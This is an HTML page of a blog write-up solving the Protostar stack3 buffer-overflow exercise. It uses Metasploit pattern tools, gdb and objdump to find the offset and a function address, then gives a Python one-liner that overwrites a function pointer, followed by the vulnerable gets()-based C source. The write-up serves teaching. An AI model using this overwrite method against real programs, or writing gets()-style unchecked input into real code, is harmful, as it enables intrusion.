<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3 | 0xRick Owned Root !</title>
<meta name="generator" content="Jekyll v3.7.4" />
<meta property="og:title" content="Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Introduction Hey I’m back again with another article , today I’m going to solve protostar stack3 but this time it’s going to be a bit different , In the last two articles I solved stack0 , stack1 and stack2 and I used the source code of the binaries to identify where the buffer overflow happens and what exploit to use. Now with stack3 we are given the source code but We are not going to use it, Instead of that we will use some practical techniques to solve this challenge. Because in a real situation we won’t have the source of the program right ? Let’s see If you haven’t read my previous articles about buffer overflow I recommend reading them first ./Stack3 Let’s first look at the program and see what does it do. ./stack3 We don’t see any output so we should give it an argument. We need to confirm that the program is vulnerable to a buffer overflow so we can pass an argument of 100 chars and see what happens python -c &quot;print &#39;A&#39; * 100&quot; | ./stack3 And we see a segfault which confirms that a buffer overflow happened , we also see this line : “calling function pointer , jumping to 0x41414141” So now we have an idea about what’s happening here, There’s a function pointer that executes a function based on the given memory address of that function. That memory address is stored in a variable and we can overwrite that variable when we exceed the buffer. We see that the function pointer was calling the address 0x41414141 and 0x41 is the hex of “A”. Now we have to do two things. The first thing is to know where the buffer overflow happens, Because here we have given the program an argument of 100 chars but we don’t know exactly the size of the buffer. The second thing is to find the memory address of the function that we need to execute. Let’s see how to do that. Finding the size of the buffer To make things easier I compiled the program on my kali box to start testing there. Metasploit has two scripts called pattern_create and pattern_offset , you can find them on kali in /usr/share/metasploit-framework/tools/exploit pattern_create creats a unique string of a defined length so we will create a pattern of 100 chars. ./pattern_create.rb -l 100 Now let’s run the program in gdb , I’m using gdb-peda First we set a break point in main . break *main This makes the program break after the first instruction of the function main() Then we run the program. It stops at the break point. We do c to make it continue then pass our argument The segfault happens and we see where it happened: 0x63413163 Now we will use pattern_offset to know what is the location of 0x63413163 ./pattern_offset -l 100 -q 63413163 And we get exact match at offset 64 , This means that the buffer size is 64 chars and after that the overflow happens. Finding the memory address of the function If we do info functions from gdb it will list all the functions and their memory addresses , we can also do that with objdump. But what is the function we’re looking for ? info functions We see a lot of functions but the most interesting one is called “win” , but the address on my kali box will be different from the address on the protostar machine. We will return to protostar and use objdump to find it. objdump -d stack3 And we got the address 0x08048424 Applying the exploit Now we can easily build our exploit , we know that the buffer is 64 chars after that we can pass the address of the function and the function pointer will execute it. python -c &quot;print &#39;A&#39; * 64 + &#39;\x24\x84\x04\x08&#39;&quot; | ./stack3 And we get the output “code flow changed successfully” We solved it without the source , now let’s look at the source #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\n&quot;); } int main(int argc, char **argv) { volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) { printf(&quot;calling function pointer, jumping to 0x%08x\n&quot;, fp); fp(); } } We see function win() is defined at the top then after that the function main() which defines the function pointer , sets a buffer of 64 chars to it , then sets its value to 0. After that it takes our argument and stores it in the buffer. The last thing is an if statement that checks if the function pointer value is changed from 0 then it calls the address of that new value. That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Hexadecimal values and Environment Variables ! - Protostar Stack1 , Stack2 Next Buffer Overflow article : Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4" />
<meta property="og:description" content="Introduction Hey I’m back again with another article , today I’m going to solve protostar stack3 but this time it’s going to be a bit different , In the last two articles I solved stack0 , stack1 and stack2 and I used the source code of the binaries to identify where the buffer overflow happens and what exploit to use. Now with stack3 we are given the source code but We are not going to use it, Instead of that we will use some practical techniques to solve this challenge. Because in a real situation we won’t have the source of the program right ? Let’s see If you haven’t read my previous articles about buffer overflow I recommend reading them first ./Stack3 Let’s first look at the program and see what does it do. ./stack3 We don’t see any output so we should give it an argument. We need to confirm that the program is vulnerable to a buffer overflow so we can pass an argument of 100 chars and see what happens python -c &quot;print &#39;A&#39; * 100&quot; | ./stack3 And we see a segfault which confirms that a buffer overflow happened , we also see this line : “calling function pointer , jumping to 0x41414141” So now we have an idea about what’s happening here, There’s a function pointer that executes a function based on the given memory address of that function. That memory address is stored in a variable and we can overwrite that variable when we exceed the buffer. We see that the function pointer was calling the address 0x41414141 and 0x41 is the hex of “A”. Now we have to do two things. The first thing is to know where the buffer overflow happens, Because here we have given the program an argument of 100 chars but we don’t know exactly the size of the buffer. The second thing is to find the memory address of the function that we need to execute. Let’s see how to do that. Finding the size of the buffer To make things easier I compiled the program on my kali box to start testing there. Metasploit has two scripts called pattern_create and pattern_offset , you can find them on kali in /usr/share/metasploit-framework/tools/exploit pattern_create creats a unique string of a defined length so we will create a pattern of 100 chars. ./pattern_create.rb -l 100 Now let’s run the program in gdb , I’m using gdb-peda First we set a break point in main . break *main This makes the program break after the first instruction of the function main() Then we run the program. It stops at the break point. We do c to make it continue then pass our argument The segfault happens and we see where it happened: 0x63413163 Now we will use pattern_offset to know what is the location of 0x63413163 ./pattern_offset -l 100 -q 63413163 And we get exact match at offset 64 , This means that the buffer size is 64 chars and after that the overflow happens. Finding the memory address of the function If we do info functions from gdb it will list all the functions and their memory addresses , we can also do that with objdump. But what is the function we’re looking for ? info functions We see a lot of functions but the most interesting one is called “win” , but the address on my kali box will be different from the address on the protostar machine. We will return to protostar and use objdump to find it. objdump -d stack3 And we got the address 0x08048424 Applying the exploit Now we can easily build our exploit , we know that the buffer is 64 chars after that we can pass the address of the function and the function pointer will execute it. python -c &quot;print &#39;A&#39; * 64 + &#39;\x24\x84\x04\x08&#39;&quot; | ./stack3 And we get the output “code flow changed successfully” We solved it without the source , now let’s look at the source #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\n&quot;); } int main(int argc, char **argv) { volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) { printf(&quot;calling function pointer, jumping to 0x%08x\n&quot;, fp); fp(); } } We see function win() is defined at the top then after that the function main() which defines the function pointer , sets a buffer of 64 chars to it , then sets its value to 0. After that it takes our argument and stores it in the buffer. The last thing is an if statement that checks if the function pointer value is changed from 0 then it calls the address of that new value. That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Hexadecimal values and Environment Variables ! - Protostar Stack1 , Stack2 Next Buffer Overflow article : Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4" />
<link rel="canonical" href="http://localhost:4000/binary-exploitation/bof3/" />
<meta property="og:url" content="http://localhost:4000/binary-exploitation/bof3/" />
<meta property="og:site_name" content="0xRick Owned Root !" />
<meta property="og:image" content="http://localhost:4000/binary-exploitation/BOF3/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-01-08T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"Introduction Hey I’m back again with another article , today I’m going to solve protostar stack3 but this time it’s going to be a bit different , In the last two articles I solved stack0 , stack1 and stack2 and I used the source code of the binaries to identify where the buffer overflow happens and what exploit to use. Now with stack3 we are given the source code but We are not going to use it, Instead of that we will use some practical techniques to solve this challenge. Because in a real situation we won’t have the source of the program right ? Let’s see If you haven’t read my previous articles about buffer overflow I recommend reading them first ./Stack3 Let’s first look at the program and see what does it do. ./stack3 We don’t see any output so we should give it an argument. We need to confirm that the program is vulnerable to a buffer overflow so we can pass an argument of 100 chars and see what happens python -c &quot;print &#39;A&#39; * 100&quot; | ./stack3 And we see a segfault which confirms that a buffer overflow happened , we also see this line : “calling function pointer , jumping to 0x41414141” So now we have an idea about what’s happening here, There’s a function pointer that executes a function based on the given memory address of that function. That memory address is stored in a variable and we can overwrite that variable when we exceed the buffer. We see that the function pointer was calling the address 0x41414141 and 0x41 is the hex of “A”. Now we have to do two things. The first thing is to know where the buffer overflow happens, Because here we have given the program an argument of 100 chars but we don’t know exactly the size of the buffer. The second thing is to find the memory address of the function that we need to execute. Let’s see how to do that. Finding the size of the buffer To make things easier I compiled the program on my kali box to start testing there. Metasploit has two scripts called pattern_create and pattern_offset , you can find them on kali in /usr/share/metasploit-framework/tools/exploit pattern_create creats a unique string of a defined length so we will create a pattern of 100 chars. ./pattern_create.rb -l 100 Now let’s run the program in gdb , I’m using gdb-peda First we set a break point in main . break *main This makes the program break after the first instruction of the function main() Then we run the program. It stops at the break point. We do c to make it continue then pass our argument The segfault happens and we see where it happened: 0x63413163 Now we will use pattern_offset to know what is the location of 0x63413163 ./pattern_offset -l 100 -q 63413163 And we get exact match at offset 64 , This means that the buffer size is 64 chars and after that the overflow happens. Finding the memory address of the function If we do info functions from gdb it will list all the functions and their memory addresses , we can also do that with objdump. But what is the function we’re looking for ? info functions We see a lot of functions but the most interesting one is called “win” , but the address on my kali box will be different from the address on the protostar machine. We will return to protostar and use objdump to find it. objdump -d stack3 And we got the address 0x08048424 Applying the exploit Now we can easily build our exploit , we know that the buffer is 64 chars after that we can pass the address of the function and the function pointer will execute it. python -c &quot;print &#39;A&#39; * 64 + &#39;\\x24\\x84\\x04\\x08&#39;&quot; | ./stack3 And we get the output “code flow changed successfully” We solved it without the source , now let’s look at the source #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf(&quot;code flow successfully changed\\n&quot;); } int main(int argc, char **argv) { volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) { printf(&quot;calling function pointer, jumping to 0x%08x\\n&quot;, fp); fp(); } } We see function win() is defined at the top then after that the function main() which defines the function pointer , sets a buffer of 64 chars to it , then sets its value to 0. After that it takes our argument and stores it in the buffer. The last thing is an if statement that checks if the function pointer value is changed from 0 then it calls the address of that new value. That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Hexadecimal values and Environment Variables ! - Protostar Stack1 , Stack2 Next Buffer Overflow article : Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4","@type":"BlogPosting","url":"http://localhost:4000/binary-exploitation/bof3/","image":"http://localhost:4000/binary-exploitation/BOF3/0.png","headline":"Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3","dateModified":"2019-01-08T00:00:00+02:00","datePublished":"2019-01-08T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/binary-exploitation/bof3/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/tagbuttons.css">
  <link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Buffer Overflow Practical Examples , metasploit , gdb and objdump ! - protostar stack3</h1>
    <p class="post-meta">
      <h7>
        Tags: 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Linux/';">Linux</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Binary Exploitation/';">Binary Exploitation</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Buffer Overflow/';">Buffer Overflow</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/c/';">c</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Python/';">Python</button> 
        
      </h7>
      <br>
      <time class="dt-published" datetime="2019-01-08T00:00:00+02:00" itemprop="datePublished">Jan 8, 2019
      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
</p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <hr />

<h3 id="introduction">Introduction</h3>
<h4 id="hey-im-back-again-with-another-article--today-im-going-to-solve-protostar-stack3-but-this-time-its-going-to-be-a-bit-different--in-the-last-two-articles-i-solved-stack0--stack1-and-stack2-and-i-used-the-source-code-of-the-binaries-to-identify-where-the-buffer-overflow-happens-and-what-exploit-to-use-now-with-stack3-we-are-given-the-source-code-but-we-are-not-going-to-use-it-instead-of-that-we-will-use-some-practical-techniques-to-solve-this-challenge-because-in-a-real-situation-we-wont-have-the-source-of-the-program-right--lets-see">Hey I’m back again with another article , today I’m going to solve protostar stack3 but this time it’s going to be a bit different , In the last two articles I solved stack0 , stack1 and stack2 and I used the source code of the binaries to identify where the buffer overflow happens and what exploit to use. Now with stack3 we are given the source code but We are not going to use it, Instead of that we will use some practical techniques to solve this challenge. Because in a real situation we won’t have the source of the program right ? Let’s see</h4>
<p><img src="/images/binary-exploitation/BOF3/0.png" alt="" />
<br /></p>
<h4 id="if-you-havent-read-my-previous-articles-about-buffer-overflow-i-recommend-reading-them-first">If you haven’t read my <a href="/binary-exploitation/bof2/">previous articles</a> about buffer overflow I recommend reading them first</h4>
<p><br /></p>
<hr />

<h3 id="stack3">./Stack3</h3>
<h4 id="lets-first-look-at-the-program-and-see-what-does-it-do">Let’s first look at the program and see what does it do.</h4>
<p><code class="highlighter-rouge"> ./stack3</code>
<img src="/images/binary-exploitation/BOF3/1.png" alt="" /></p>
<h4 id="we-dont-see-any-output-so-we-should-give-it-an-argument-we-need-to-confirm-that-the-program-is-vulnerable-to-a-buffer-overflow-so-we-can-pass-an-argument-of-100-chars-and-see-what-happens">We don’t see any output so we should give it an argument. We need to confirm that the program is vulnerable to a buffer overflow so we can pass an argument of 100 chars and see what happens</h4>
<p><code class="highlighter-rouge">python -c "print 'A' * 100" | ./stack3</code>
<img src="/images/binary-exploitation/BOF3/2.png" alt="" /></p>
<h4 id="and-we-see-a-segfault-which-confirms-that-a-buffer-overflow-happened--we-also-see-this-line--calling-function-pointer--jumping-to-0x41414141">And we see a segfault which confirms that a buffer overflow happened , we also see this line : “calling function pointer , jumping to 0x41414141”</h4>
<h4 id="so-now-we-have-an-idea-about-whats-happening-here-theres-a-function-pointer-that-executes-a-function-based-on-the-given-memory-address-of-that-function-that-memory-address-is-stored-in-a-variable-and-we-can-overwrite-that-variable-when-we-exceed-the-buffer-we-see-that-the-function-pointer-was-calling-the-address-0x41414141-and-0x41-is-the-hex-of-a-now-we-have-to-do-two-things-the-first-thing-is-to-know-where-the-buffer-overflow-happens-because-here-we-have-given-the-program-an-argument-of-100-chars-but-we-dont-know-exactly-the-size-of-the-buffer-the-second-thing-is-to-find-the-memory-address-of-the-function-that-we-need-to-execute-lets-see-how-to-do-that">So now we have an idea about what’s happening here, There’s a function pointer that executes a function based on the given memory address of that function. That memory address is stored in a variable and we can overwrite that variable when we exceed the buffer. We see that the function pointer was calling the address <code class="highlighter-rouge">0x41414141</code> and <code class="highlighter-rouge">0x41</code> is the hex of “A”. Now we have to do two things. The first thing is to know where the buffer overflow happens, Because here we have given the program an argument of 100 chars but we don’t know exactly the size of the buffer. The second thing is to find the memory address of the function that we need to execute. Let’s see how to do that.</h4>
<p><br /></p>
<hr />

<h3 id="finding-the-size-of-the-buffer">Finding the size of the buffer</h3>
<h4 id="to-make-things-easier-i-compiled-the-program-on-my-kali-box-to-start-testing-there">To make things easier I compiled the program on my kali box to start testing there.</h4>
<h4 id="metasploit-has-two-scripts-called-pattern_create-and-pattern_offset--you-can-find-them-on-kali-in-usrsharemetasploit-frameworktoolsexploit">Metasploit has two scripts called <code class="highlighter-rouge">pattern_create</code> and <code class="highlighter-rouge">pattern_offset</code> , you can find them on kali in <code class="highlighter-rouge">/usr/share/metasploit-framework/tools/exploit</code></h4>
<h4 id="pattern_create-creats-a-unique-string-of-a-defined-length-so-we-will-create-a-pattern-of-100-chars"><code class="highlighter-rouge">pattern_create</code> creats a unique string of a defined length so we will create a pattern of 100 chars.</h4>
<p><code class="highlighter-rouge">./pattern_create.rb -l 100</code>
<img src="/images/binary-exploitation/BOF3/3.png" alt="" /></p>
<h4 id="now-lets-run-the-program-in-gdb--im-using-gdb-peda">Now let’s run the program in gdb , I’m using <a href="https://github.com/longld/peda">gdb-peda</a></h4>
<h4 id="first-we-set-a-break-point-in-main-">First we set a break point in main .</h4>
<p><code class="highlighter-rouge">break *main</code></p>
<h4 id="this-makes-the-program-break-after-the-first-instruction-of-the-function-main">This makes the program break after the first instruction of the function main()</h4>
<p><img src="/images/binary-exploitation/BOF3/4.png" alt="" /></p>
<h4 id="then-we-run-the-program">Then we <code class="highlighter-rouge">run</code> the program.</h4>
<p><img src="/images/binary-exploitation/BOF3/5.png" alt="" /></p>
<h4 id="it-stops-at-the-break-point-we-do-c-to-make-it-continue-then-pass-our-argument">It stops at the break point. We do <code class="highlighter-rouge">c</code> to make it continue then pass our argument</h4>
<p><img src="/images/binary-exploitation/BOF3/6.png" alt="" /></p>
<h4 id="the-segfault-happens-and-we-see-where-it-happened-0x63413163">The segfault happens and we see where it happened: <code class="highlighter-rouge">0x63413163</code></h4>
<p><img src="/images/binary-exploitation/BOF3/7.png" alt="" /></p>
<h4 id="now-we-will-use-pattern_offset-to-know-what-is-the-location-of-0x63413163">Now we will use <code class="highlighter-rouge">pattern_offset</code> to know what is the location of <code class="highlighter-rouge">0x63413163</code></h4>
<p><code class="highlighter-rouge">./pattern_offset -l 100 -q 63413163</code>
<img src="/images/binary-exploitation/BOF3/8.png" alt="" /></p>
<h4 id="and-we-get-exact-match-at-offset-64--this-means-that-the-buffer-size-is-64-chars-and-after-that-the-overflow-happens">And we get exact match at offset 64 , This means that the buffer size is 64 chars and after that the overflow happens.</h4>
<p><br /></p>
<hr />

<h3 id="finding-the-memory-address-of-the-function">Finding the memory address of the function</h3>
<h4 id="if-we-do-info-functions-from-gdb-it-will-list-all-the-functions-and-their-memory-addresses--we-can-also-do-that-with-objdump-but-what-is-the-function-were-looking-for-">If we do <code class="highlighter-rouge">info functions</code> from gdb it will list all the functions and their memory addresses , we can also do that with objdump. But what is the function we’re looking for ?</h4>
<p><code class="highlighter-rouge">info functions</code>
<img src="/images/binary-exploitation/BOF3/9.png" alt="" /></p>
<h4 id="we-see-a-lot-of-functions-but-the-most-interesting-one-is-called-win--but-the-address-on-my-kali-box-will-be-different-from-the-address-on-the-protostar-machine-we-will-return-to-protostar-and-use-objdump-to-find-it">We see a lot of functions but the most interesting one is called “win” , but the address on my kali box will be different from the address on the protostar machine. We will return to protostar and use objdump to find it.</h4>
<p><code class="highlighter-rouge">objdump -d stack3</code>
<img src="/images/binary-exploitation/BOF3/10.png" alt="" />
<br />
<br />
<br />
<img src="/images/binary-exploitation/BOF3/11.png" alt="" /></p>
<h4 id="and-we-got-the-address-0x08048424">And we got the address <code class="highlighter-rouge">0x08048424</code></h4>
<p><br /></p>
<hr />

<h3 id="applying-the-exploit">Applying the exploit</h3>
<h4 id="now-we-can-easily-build-our-exploit--we-know-that-the-buffer-is-64-chars-after-that-we-can-pass-the-address-of-the-function-and-the-function-pointer-will-execute-it">Now we can easily build our exploit , we know that the buffer is 64 chars after that we can pass the address of the function and the function pointer will execute it.</h4>
<p><code class="highlighter-rouge">python -c "print 'A' * 64 + '\x24\x84\x04\x08'" | ./stack3</code>
<img src="/images/binary-exploitation/BOF3/12.png" alt="" /></p>
<h4 id="and-we-get-the-output-code-flow-changed-successfully">And we get the output “code flow changed successfully”</h4>
<h4 id="we-solved-it-without-the-source--now-lets-look-at-the-source">We solved it without the source , now let’s look at the source</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void win()
{
 printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
 volatile int (*fp)();
 char buffer[64];

 fp = 0;

 gets(buffer);

 if(fp) {
  printf("calling function pointer, jumping to 0x%08x\n", fp);
  fp();
 }
}
</code></pre></div></div>
<h4 id="we-see-function-win-is-defined-at-the-top-then-after-that-the-function-main-which-defines-the-function-pointer--sets-a-buffer-of-64-chars-to-it--then-sets-its-value-to-0-after-that-it-takes-our-argument-and-stores-it-in-the-buffer-the-last-thing-is-an-if-statement-that-checks-if-the-function-pointer-value-is-changed-from-0-then-it-calls-the-address-of-that-new-value">We see function <code class="highlighter-rouge">win()</code> is defined at the top then after that the function <code class="highlighter-rouge">main()</code> which defines the function pointer , sets a buffer of 64 chars to it , then sets its value to 0. After that it takes our argument and stores it in the buffer. The last thing is an if statement that checks if the function pointer value is changed from 0 then it calls the address of that new value.</h4>
<p><br />
<br /></p>
<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
<h4 id="dont-forget-to-read-the-previous-articles--tweet-about-the-article-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous articles</a> , Tweet about the article if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
<h4 id="thanks-for-reading">Thanks for reading.</h4>
<p><br />
<br /></p>
<h4 id="previous-buffer-overflow-article--buffer-overflow-practical-examples--hexadecimal-values-and-environment-variables----protostar-stack1--stack2">Previous Buffer Overflow article : <a href="/binary-exploitation/bof2/">Buffer Overflow Practical Examples , Hexadecimal values and Environment Variables ! - Protostar Stack1 , Stack2</a></h4>
<h4 id="next-buffer-overflow-article--buffer-overflow-practical-examples--exploiting-eip---protostar-stack4">Next Buffer Overflow article : <a href="/binary-exploitation/bof4/">Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4</a></h4>
<hr />


  </div>
<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/binary-exploitation/bof3/" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">0xRick Owned Root !</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">0xRick Owned Root !</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>

